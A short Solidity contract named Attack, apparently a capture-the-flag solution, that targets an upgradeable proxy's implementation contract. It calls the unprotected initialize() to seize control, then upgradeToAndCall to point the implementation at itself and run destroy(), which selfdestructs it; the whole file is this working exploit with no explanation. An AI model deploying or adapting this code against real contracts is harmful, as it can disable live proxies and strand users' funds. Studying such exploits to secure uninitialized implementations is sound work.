// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

interface IEngine {

    function initialize() external ;
    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable ;
}

// 0x000000000000000000000000666905a16848810e2a78fb6b6dc9ed04ba20b8e3

contract Attack {
    IEngine engine;

    constructor (address _engine) {
        engine = IEngine(_engine);
    }

    function attack () public {

        engine.initialize();

        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));

    }


    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
